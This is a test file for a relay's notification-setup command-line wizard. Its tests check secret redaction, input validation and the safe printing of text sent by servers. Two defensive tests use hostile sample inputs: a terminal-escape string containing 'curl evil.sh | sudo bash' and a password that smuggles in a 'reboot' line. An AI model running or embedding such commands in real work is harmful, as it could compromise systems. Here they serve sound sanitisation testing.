/**
 * `sudo morphit-ops offline-notify` — what it saves, what it never saves, and
 * what it never prints. Prompts, the relay's adminCli, the file and the relay
 * restart are all stand-ins; the real ones are exercised end to end in
 * docs/OPERATIONS.md's recipe (and were, against real servers, when written).
 */
import { describe, expect, it } from 'vitest';
import {
	adminInput,
	NO_LINK,
	runOfflineNotify,
	type AdminAnswer,
	type OfflineNotifyDeps
} from '../src/commands/offlineNotify.ts';

interface Run {
	readonly code: number;
	readonly printed: string;
	readonly saved: Array<Record<string, string>>;
	/** The channels each save owned (lib/offlineNotifyEnv.ts renderNotifyEnv). */
	readonly owned: Array<readonly string[]>;
	readonly adminCalls: Array<{ args: readonly string[]; input: Record<string, string> }>;
	readonly restarts: number;
	readonly menus: string[][];
	readonly mints: string[];
	/** Every step in order: `admin <args>`, `restart`, `save`. */
	readonly steps: string[];
}

/** Answers: a string for ask/askPassword, `#n` / `#last` / `#label text` for a choice, `y`/`n` for yes/no. */
async function wizard(
	answers: string[],
	opts: {
		file?: Record<string, string>;
		status?: Partial<AdminAnswer>;
		/** Successive `status` answers (the last one repeats), over `status`. */
		statuses?: Array<Partial<AdminAnswer>>;
		admin?: (args: readonly string[], input: Record<string, string>) => AdminAnswer;
		deps?: Partial<OfflineNotifyDeps>;
		positional?: string[];
	} = {}
): Promise<Run> {
	let file = { ...(opts.file ?? {}) };
	const printed: string[] = [];
	const saved: Array<Record<string, string>> = [];
	const owned: Array<readonly string[]> = [];
	const adminCalls: Run['adminCalls'] = [];
	const menus: string[][] = [];
	const mints: string[] = [];
	const steps: string[] = [];
	const statuses = [...(opts.statuses ?? [])];
	let restarts = 0;
	const next = (): string => {
		const a = answers.shift();
		if (a === undefined) throw new Error('the wizard asked more than the test answers');
		return a;
	};
	const code = await runOfflineNotify(
		{ positional: opts.positional ?? [], colorEnabled: false, repoRoot: '/opt/morphit' },
		{
			isRoot: () => true,
			isTTY: true,
			print: (l) => printed.push(l),
			ask: async (_q, d) => {
				const a = next();
				return a === '' ? (d ?? '') : a;
			},
			askPassword: async () => next(),
			askYesNo: async () => next() === 'y',
			askChoice: async (_q, o) => {
				menus.push([...o]);
				const a = next();
				if (a === '#last') return o.length - 1;
				if (a.startsWith('#label ')) {
					const i = o.findIndex((x) => x === a.slice(7));
					if (i < 0) throw new Error(`no "${a.slice(7)}" in [${o.join(' | ')}]`);
					return i;
				}
				return Number(a.slice(1));
			},
			admin: async (args, input) => {
				adminCalls.push({ args, input });
				steps.push(`admin ${args.join(' ')}`);
				if (args[0] === 'status')
					return {
						ok: true,
						site: 'Vigilante Trading',
						link: 'https://vigilante.trading',
						hiddenOnly: false,
						tor: true,
						offered: [],
						off: {},
						...opts.status,
						...(statuses.length > 1 ? statuses.shift() : statuses[0])
					};
				return opts.admin?.(args, input) ?? { ok: true };
			},
			readEnv: () => ({ ...file }),
			writeEnv: (v, o) => {
				saved.push({ ...v });
				owned.push([...o]);
				steps.push('save');
				file = { ...v };
			},
			restartRelay: async () => {
				restarts++;
				steps.push('restart');
				return ['email'];
			},
			mintMatrix: async (hs) => {
				mints.push(hs);
				return 'syt_minted_token';
			},
			...opts.deps
		}
	);
	return {
		code,
		printed: printed.join('\n'),
		saved,
		owned,
		adminCalls,
		restarts,
		menus,
		mints,
		steps
	};
}

const EMAIL = [
	'#label Set up Email',
	'smtp.example.org',
	'#0',
	'',
	'ops@example.org',
	'pa$$ word `x`',
	'',
	'me@example.net'
];

describe('morphit-ops offline-notify', () => {
	it('needs sudo', async () => {
		const r = await wizard([], { deps: { isRoot: () => false } });
		expect(r.code).toBe(1);
		expect(r.printed).toMatch(/sudo morphit-ops offline-notify/);
		expect(r.adminCalls).toHaveLength(0);
	});

	it('`status` (or no terminal) shows what is on and asks nothing', async () => {
		const r = await wizard([], {
			positional: ['status'],
			status: {
				offered: ['matrix'],
				matrix: '@notices:vigilante.trading',
				off: { telegram: 'zero_clearnet' }
			}
		});
		expect(r.code).toBe(0);
		expect(r.menus).toHaveLength(0);
		expect(r.printed).toMatch(/Matrix\s+on — notes come from @notices:vigilante\.trading/);
		expect(r.printed).toMatch(/Telegram\s+off — this site uses no clearnet/);
	});

	it('email: tested with a real note, then saved, restarted — the password never printed', async () => {
		const r = await wizard([...EMAIL, '#last']);
		expect(r.code).toBe(0);
		const send = r.adminCalls.find((c) => c.args[0] === 'send')!;
		// The test address goes on stdin — never on the command line, where every
		// user on the box could read it in the process list.
		expect(send.args).toEqual(['send', 'email']);
		expect(send.input.to).toBe('me@example.net');
		expect(r.adminCalls.every((c) => !c.args.join(' ').includes('@'))).toBe(true);
		expect(send.input.MORPHIT_NOTIFY_EMAIL_PASSWORD).toBe('pa$$ word `x`');
		expect(r.saved).toEqual([
			{
				MORPHIT_NOTIFY_EMAIL_HOST: 'smtp.example.org',
				MORPHIT_NOTIFY_EMAIL_PORT: '587',
				MORPHIT_NOTIFY_EMAIL_SECURITY: 'starttls',
				MORPHIT_NOTIFY_EMAIL_USER: 'ops@example.org',
				MORPHIT_NOTIFY_EMAIL_PASSWORD: 'pa$$ word `x`',
				MORPHIT_NOTIFY_EMAIL_FROM: 'ops@example.org'
			}
		]);
		expect(r.restarts).toBe(1);
		expect(r.printed).toMatch(/Email is on/);
		expect(r.printed).not.toContain('pa$$');
	});

	it('a failed test saves nothing — unless the operator says so', async () => {
		const fail = (args: readonly string[]): AdminAnswer =>
			args[0] === 'send'
				? { ok: false, error: 'failed', reason: 'SmtpError: AUTH (535)' }
				: { ok: true };
		const no = await wizard([...EMAIL, 'n', '#last'], { admin: fail });
		expect(no.saved).toHaveLength(0);
		expect(no.restarts).toBe(0);
		expect(no.printed).toMatch(/SmtpError: AUTH \(535\)/);
		const yes = await wizard([...EMAIL, 'y', '#last'], { admin: fail });
		expect(yes.saved).toHaveLength(1);
	});

	it('a value with a line break is refused before anything is tested or written', async () => {
		const answers = [...EMAIL];
		answers[5] = 'pass\nreboot';
		const r = await wizard([...answers, '#last']);
		expect(r.saved).toHaveLength(0);
		expect(r.adminCalls.some((c) => c.args[0] === 'send')).toBe(false);
		expect(r.printed).toMatch(/cannot contain a line break/);
	});

	it('a Tor-only site offers no Telegram or Session, and refuses a clearnet homeserver', async () => {
		const r = await wizard(['#label Set up Matrix', 'https://matrix.org', '#last'], {
			status: { hiddenOnly: true, link: 'http://x.onion' }
		});
		expect(r.menus[0]).not.toContain('Set up Telegram');
		expect(r.menus[0]).not.toContain('Set up Session');
		expect(r.printed).toMatch(/must be an \.onion address/);
		expect(r.saved).toHaveLength(0);
	});

	it('Matrix: the account the token belongs to is asked, and saved; the token never printed', async () => {
		const r = await wizard(
			['#label Set up Matrix', 'https://matrix.example.org', '#1', 'syt_secret_token', '', '#last'],
			{
				admin: (args) =>
					args[0] === 'check' ? { ok: true, userId: '@notices:matrix.example.org' } : { ok: true }
			}
		);
		expect(r.saved[0]).toEqual({
			MORPHIT_NOTIFY_MATRIX_HOMESERVER: 'https://matrix.example.org',
			MORPHIT_NOTIFY_MATRIX_TOKEN: 'syt_secret_token',
			MORPHIT_NOTIFY_MATRIX_USER_ID: '@notices:matrix.example.org'
		});
		expect(r.printed).not.toContain('syt_secret_token');
	});

	it('Telegram: the bot username comes from Telegram (getMe), not from the operator', async () => {
		const r = await wizard(['#label Set up Telegram', '123:' + 'A'.repeat(30), '#last'], {
			admin: (args) =>
				args[0] === 'check' ? { ok: true, username: 'VigilanteTradingBot' } : { ok: true }
		});
		expect(r.saved[0]).toEqual({
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: '123:' + 'A'.repeat(30),
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'VigilanteTradingBot'
		});
		expect(r.printed).not.toContain('AAAAAAAAAA');
		// Telegram's check really signs in: "works" is earned.
		expect(r.printed).toMatch(/The Telegram account works/);
	});

	it('Session without a test note (nothing signs in): never called working, only complete', async () => {
		const session = await wizard(['#label Set up Session', '#0', '', '#last'], {
			admin: (args) =>
				args[0] === 'new-session'
					? { ok: true, mnemonic: 'w '.repeat(13).trim(), sessionId: '05' + 'ab'.repeat(32) }
					: { ok: true }
		});
		for (const r of [session]) {
			expect(r.adminCalls.some((c) => c.args[0] === 'check')).toBe(true);
			expect(r.adminCalls.some((c) => c.args[0] === 'send')).toBe(false);
			expect(r.printed).not.toMatch(/account works/);
			expect(r.printed).toMatch(/settings are complete \(not tested/);
		}
	});

	it('Session: a new account is made by the relay; the recovery words are saved, never shown', async () => {
		const words = 'w1 w2 w3 w4 w5 w6 w7 w8 w9 w10 w11 w12 w13';
		const r = await wizard(['#label Set up Session', '#0', '', '#last'], {
			admin: (args) =>
				args[0] === 'new-session'
					? { ok: true, mnemonic: words, sessionId: '05' + 'ab'.repeat(32) }
					: { ok: true }
		});
		expect(r.saved[0]).toEqual({ MORPHIT_NOTIFY_SESSION_MNEMONIC: words });
		expect(r.printed).toContain('05' + 'ab'.repeat(32));
		expect(r.printed).not.toContain('w1 w2');
	});

	it('changing a channel tests it with what will be saved: a cleared setting is cleared for the test too', async () => {
		const file = {
			MORPHIT_NOTIFY_XMPP_JID: 'old@x.org',
			MORPHIT_NOTIFY_XMPP_PASSWORD: 'p',
			MORPHIT_NOTIFY_XMPP_HOST: 'old-host.x.org',
			MORPHIT_NOTIFY_EMAIL_HOST: 'keep.example.org'
		};
		const r = await wizard(
			['#label Change XMPP (Jabber)', 'bot@new.org', 'pw', '', '#0', '', 'me@new.org', '#last'],
			{ file }
		);
		const send = r.adminCalls.find((c) => c.args[0] === 'send')!;
		expect(send.input.MORPHIT_NOTIFY_XMPP_HOST).toBe('');
		expect(r.saved[0]!.MORPHIT_NOTIFY_XMPP_HOST).toBe('');
		expect(r.saved[0]!.MORPHIT_NOTIFY_EMAIL_HOST).toBe('keep.example.org');
	});

	it('turning an app off deletes its settings, keeps the rest, restarts the relay', async () => {
		const file = {
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't',
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'Bot_1',
			MORPHIT_NOTIFY_EMAIL_HOST: 'h'
		};
		const r = await wizard(['#label Turn an app off', '#label Telegram', 'y', '#last'], {
			file,
			admin: (args) => (args[0] === 'purge-channel' ? { ok: true, removed: 3 } : { ok: true })
		});
		// Users' saved addresses for it go FIRST (while the bot can still sign
		// in to leave Matrix rooms), then the settings.
		expect(r.adminCalls.map((c) => c.args.join(' '))).toContain('purge-channel telegram');
		expect(r.printed).toMatch(/3 users' Telegram addresses deleted/);
		expect(r.saved).toEqual([{ MORPHIT_NOTIFY_EMAIL_HOST: 'h' }]);
		expect(r.restarts).toBe(1);
	});

	it('if the users’ addresses cannot be deleted, the settings stay too', async () => {
		const file = { MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't', MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'Bot_1' };
		const r = await wizard(['#label Turn an app off', '#label Telegram', 'y', '#last'], {
			file,
			admin: (args) =>
				args[0] === 'purge-channel'
					? { ok: false, error: 'failed', reason: 'db down' }
					: { ok: true }
		});
		expect(r.saved).toHaveLength(0);
		expect(r.printed).toMatch(/Nothing was changed/);
	});

	const START_OVER = 'Start over (forget every user’s saved address)';

	it('a key that is missing or another one: says so, and offers to start over', async () => {
		for (const key of ['missing', 'mismatch']) {
			const r = await wizard(['#last'], { status: { key } });
			expect(r.menus[0]).toContain(START_OVER);
			expect(r.printed).toMatch(/⚠ Users' saved addresses cannot be opened/);
			expect(r.printed).toContain('/var/lib/morphit-relay/offline-notify.key');
		}
		const ok = await wizard(['#last'], { status: { key: 'ok' } });
		expect(ok.menus[0]).not.toContain(START_OVER);
		const none = await wizard(['#last'], { status: { key: 'none' } });
		expect(none.menus[0]).not.toContain(START_OVER);
		expect(none.printed).not.toMatch(/key/i);
	});

	// Review R5 #1: "Start over" deletes every user's addresses. A key file the
	// relay's tool could not READ, or a database that did not answer, says
	// nothing about the addresses: no Start over, and no alarm — what to check.
	it('a key the tool could not read, a database that did not answer, no state folder: no Start over, a calm note', async () => {
		const expected: Record<string, RegExp> = {
			unreadable:
				/could not read its key file[\s\S]*addresses are kept[\s\S]*ls -l \/var\/lib\/morphit-relay\//,
			db_error: /database did not answer[\s\S]*They are kept\. Check:  sudo morphit-ops doctor/,
			no_state_dir: /no folder for its own files[\s\S]*sudo morphit-ops doctor/,
			something_new: /Could not tell whether[\s\S]*something_new[\s\S]*sudo morphit-ops doctor/
		};
		for (const [key, re] of Object.entries(expected)) {
			const r = await wizard(['#last'], {
				status: { key, keyDetail: 'EACCES \u001b[31mred\u001b[0m ‮evil' }
			});
			expect(r.menus[0], key).not.toContain(START_OVER);
			expect(r.printed, key).toMatch(re);
			expect(r.printed, key).not.toContain('⚠');
			expect(r.printed, key).not.toMatch(/cannot be opened|start over/i);
			// The relay's own sentence, as plain text.
			expect(r.printed, key).toContain('The relay says: EACCES red evil');
			expect(r.printed, key).not.toMatch(/[\u001b‮]/);
		}
	});

	it('start over: deleted, the relay restarted, and its new key confirmed', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'y', '#last'], {
			statuses: [{ key: 'missing' }, { key: 'ok' }]
		});
		// Reset first, then a restart (the relay makes its new key when it
		// starts), then the relay is asked how its key is now.
		expect(r.steps.slice(1, 4)).toEqual(['admin reset', 'restart', 'admin status']);
		expect(r.restarts).toBe(1);
		expect(r.saved).toHaveLength(0);
		expect(r.printed).toMatch(/The relay is back with a new key/);
	});

	it('start over: a relay that still reports a key problem afterwards is not called fixed', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'y', '#last'], {
			status: { key: 'missing' }
		});
		expect(r.restarts).toBe(1);
		expect(r.printed).not.toMatch(/back with a new key/);
		expect(r.printed).toMatch(/still cannot use a new key[\s\S]*journalctl -u morphit-relay/);
	});

	// Review W2: a reset that failed must not be followed by a restart (nor
	// reported as done).
	it('start over: a reset that failed changes nothing and restarts nothing', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'y', '#last'], {
			status: { key: 'mismatch' },
			admin: (args) =>
				args[0] === 'reset' ? { ok: false, error: 'failed', reason: 'db down' } : { ok: true }
		});
		expect(r.adminCalls.map((c) => c.args[0])).toContain('reset');
		expect(r.restarts).toBe(0);
		expect(r.saved).toHaveLength(0);
		expect(r.printed).toMatch(/It did not work: db down\. Nothing was changed\./);
		expect(r.printed).not.toMatch(/old key file are deleted|back with a new key/);
	});

	it('start over is asked first; "no" deletes nothing', async () => {
		const r = await wizard([`#label ${START_OVER}`, 'n', '#last'], { status: { key: 'missing' } });
		expect(r.adminCalls.map((c) => c.args[0])).not.toContain('reset');
		expect(r.restarts).toBe(0);
	});

	const MATRIX_FILE = {
		MORPHIT_NOTIFY_MATRIX_HOMESERVER: 'https://m.example',
		MORPHIT_NOTIFY_MATRIX_TOKEN: 't',
		MORPHIT_NOTIFY_MATRIX_USER_ID: '@bot:m.example',
		MORPHIT_NOTIFY_EMAIL_HOST: 'h'
	};

	// Review R5 #2: the bot needs its settings to leave the chats it has not
	// left yet. They stay until it has.
	it('turning Matrix off while the bot still has chats to leave keeps Matrix set up', async () => {
		const r = await wizard(['#label Turn an app off', '#label Matrix', 'y', '#last'], {
			file: MATRIX_FILE,
			status: { offered: ['matrix'], matrix: '@bot:m.example' },
			admin: (args) =>
				args[0] === 'purge-channel' ? { ok: true, removed: 3, left: 1, waiting: 2 } : { ok: true }
		});
		expect(r.adminCalls.map((c) => c.args.join(' '))).toContain('purge-channel matrix');
		expect(r.saved).toHaveLength(0);
		expect(r.restarts).toBe(0);
		expect(r.printed).toMatch(/3 users' Matrix addresses deleted/);
		expect(r.printed).toMatch(/The bot left 1 chat\./);
		expect(r.printed).toMatch(/could not leave 2 chats yet/);
		expect(r.printed).toMatch(/Matrix stays set up, so the relay keeps trying to leave them/);
		expect(r.printed).toMatch(/again later/);
	});

	it('turning Matrix off once the bot has left every chat removes its settings', async () => {
		const r = await wizard(['#label Turn an app off', '#label Matrix', 'y', '#last'], {
			file: MATRIX_FILE,
			admin: (args) =>
				args[0] === 'purge-channel' ? { ok: true, removed: 3, left: 3, waiting: 0 } : { ok: true }
		});
		expect(r.printed).toMatch(/The bot left 3 chats\./);
		expect(r.printed).not.toMatch(/could not leave/);
		expect(r.saved).toEqual([{ MORPHIT_NOTIFY_EMAIL_HOST: 'h' }]);
		expect(r.owned).toEqual([['matrix']]);
		expect(r.restarts).toBe(1);
	});

	// Review R5 #4: the bot's password must never cross the internet in clear.
	it('Matrix: an http:// homeserver on the clearnet is refused before anything is sent', async () => {
		const r = await wizard(['#label Set up Matrix', 'http://matrix.example.org', '#last']);
		expect(r.printed).toMatch(/starts with http:\/\/[\s\S]*unencrypted[\s\S]*https:\/\//);
		expect(r.printed).toMatch(/Nothing was changed/);
		expect(r.mints).toEqual([]);
		expect(r.adminCalls.every((c) => c.args[0] === 'status')).toBe(true);
		expect(r.menus).toHaveLength(2); // the main menu, twice: no sign-in question
		expect(r.saved).toHaveLength(0);
	});

	it('Matrix: http:// is fine for a homeserver on this server or an .onion address', async () => {
		const local = await wizard(
			['#label Set up Matrix', 'http://127.0.0.1:8008', '#0', 'notices', 'pw', '', '#last'],
			{
				admin: (args) =>
					args[0] === 'check' ? { ok: true, userId: '@notices:localhost' } : { ok: true }
			}
		);
		expect(local.mints).toEqual(['http://127.0.0.1:8008']);
		expect(local.saved[0]!.MORPHIT_NOTIFY_MATRIX_HOMESERVER).toBe('http://127.0.0.1:8008');
		const onion = `http://${'a'.repeat(56)}.onion`;
		const tor = await wizard(['#label Set up Matrix', onion, 'syt_x', '', '#last'], {
			status: { hiddenOnly: true, link: 'http://x.onion' },
			admin: (args) => (args[0] === 'check' ? { ok: true, userId: '@n:onion' } : { ok: true })
		});
		expect(tor.printed).not.toMatch(/unencrypted/);
		expect(tor.saved[0]!.MORPHIT_NOTIFY_MATRIX_HOMESERVER).toBe(onion);
	});

	// Review R5 #6: no_link / not_set in plain words, and no server contacted
	// when the relay already said there is no link.
	it('no address to link to: said plainly, and nothing is asked, tested or signed in to', async () => {
		const r = await wizard(
			['#label Set up Matrix', '#label Set up Email', '#label Send a test note', '#last'],
			{ status: { link: null, offered: ['email'], email: 'n@example.org' } }
		);
		// Each choice ends right there: no question asked, back at the menu.
		expect(r.printed.match(/Nothing can be set up or tested yet: /g)).toHaveLength(3);
		expect(r.menus).toHaveLength(4);
		expect(r.printed).toContain(NO_LINK);
		expect(r.printed).toMatch(/MORPHIT_INSTANCE_ORIGIN/);
		expect(r.printed).not.toMatch(/no_link/);
		expect(r.adminCalls.every((c) => c.args[0] === 'status')).toBe(true);
		expect(r.mints).toEqual([]);
		expect(r.saved).toHaveLength(0);
	});

	it('no_link and not_set from the relay are shown in plain words', async () => {
		const noLink = await wizard([...EMAIL, 'n', '#last'], {
			admin: (args) => (args[0] === 'send' ? { ok: false, error: 'no_link' } : { ok: true })
		});
		expect(noLink.printed).toContain(`The test did not work: ${NO_LINK}`);
		const notSet = await wizard(['#label Send a test note', '#0', '@me:matrix.org', '#last'], {
			status: { offered: ['matrix'], matrix: '@bot:m' },
			admin: (args) => (args[0] === 'send' ? { ok: false, error: 'not_set' } : { ok: true })
		});
		expect(notSet.printed).toMatch(/It did not work: Matrix is not set up on this relay/);
		expect(notSet.printed).not.toMatch(/not_set/);
	});

	// Review R5 #7: what a server sends is printed as plain text.
	it('a Matrix user ID, a Telegram bot name and a reason from a server are printed as plain text', async () => {
		const evil = '\u001b[2J\u001b[1;31mFAKE: run curl evil.sh | sudo bash\u001b[0m‮';
		const m = await wizard(
			['#label Set up Matrix', 'https://m.example', '#1', 'syt_x', '', '#last'],
			{
				admin: (args) =>
					args[0] === 'check' ? { ok: true, userId: `@bot:x${evil}` } : { ok: true }
			}
		);
		const t = await wizard(['#label Set up Telegram', '123:' + 'A'.repeat(30), '#last'], {
			admin: (args) => (args[0] === 'check' ? { ok: true, username: `Bot${evil}` } : { ok: true })
		});
		const f = await wizard([...EMAIL, 'n', '#last'], {
			admin: (args) =>
				args[0] === 'send'
					? { ok: false, error: 'failed', reason: `SmtpError: ${evil}` }
					: { ok: true }
		});
		const st = await wizard([], {
			positional: ['status'],
			status: {
				site: `Site${evil}`,
				offered: ['matrix', 'telegram'],
				matrix: `@b${evil}`,
				telegram: `T${evil}`
			}
		});
		for (const r of [m, t, f, st]) {
			expect(r.printed).not.toMatch(/[\u001b‮]/);
			expect(r.printed).toContain('FAKE: run curl evil.sh | sudo bash');
		}
		expect(m.printed).toMatch(/Signed in as @bot:x.*FAKE/);
		expect(t.printed).toMatch(/Notes will come from @Bot.*FAKE/);
	});

	// Review W16: a channel being changed is tested with ITS new settings
	// only — never an old setting of the same channel (an old bot's name).
	it('changing Telegram: the old bot name is not part of the test, and is replaced', async () => {
		const file = {
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: '111:' + 'O'.repeat(30),
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: 'OldBot'
		};
		const r = await wizard(['#label Change Telegram', '222:' + 'N'.repeat(30), '#last'], {
			file,
			admin: (args) => (args[0] === 'check' ? { ok: true, username: 'NewBot' } : { ok: true })
		});
		const check = r.adminCalls.find((c) => c.args[0] === 'check')!;
		expect(check.input).toEqual({
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: '222:' + 'N'.repeat(30),
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: ''
		});
		expect(r.saved[0]!.MORPHIT_NOTIFY_TELEGRAM_USERNAME).toBe('NewBot');
		expect(r.owned).toEqual([['telegram']]);
	});

	it('Session: existing recovery words that are not exactly 13 are refused before anything is tested or saved', async () => {
		for (const n of [12, 14]) {
			const words = Array.from({ length: n }, (_, i) => `w${i + 1}`).join(' ');
			const r = await wizard(['#label Set up Session', '#1', words, '#last']);
			expect(r.saved, `${n} words`).toEqual([]);
			expect(r.restarts).toBe(0);
			expect(r.adminCalls.map((c) => c.args[0])).toEqual(['status', 'status']);
			expect(r.printed).not.toContain('w1 w2');
		}
		// Thirteen (spaces tidied) go on to be checked and saved.
		const words = Array.from({ length: 13 }, (_, i) => `w${i + 1}`).join('  ');
		const r = await wizard(['#label Set up Session', '#1', ` ${words} `, '', '#last']);
		expect(r.saved).toEqual([{ MORPHIT_NOTIFY_SESSION_MNEMONIC: words.replace(/ +/g, ' ') }]);
	});

	it('"Send a test note" never offers Telegram (its users start the chat; there is no address to send to)', async () => {
		const r = await wizard(['#label Send a test note', '#0', 'me@example.net', '#last'], {
			status: { offered: ['telegram', 'email'] }
		});
		expect(r.menus[1]).toEqual(['Email']);
		const send = r.adminCalls.find((c) => c.args[0] === 'send')!;
		expect(send.args).toEqual(['send', 'email']);
		const onlyTelegram = await wizard(['#last'], { status: { offered: ['telegram'] } });
		expect(onlyTelegram.menus[0]).not.toContain('Send a test note');
	});

	it('adminInput: every key of the channel, unset ones as empty', () => {
		expect(adminInput({ MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't', OTHER: 'x' }, 'telegram')).toEqual({
			MORPHIT_NOTIFY_TELEGRAM_TOKEN: 't',
			MORPHIT_NOTIFY_TELEGRAM_USERNAME: ''
		});
	});
});
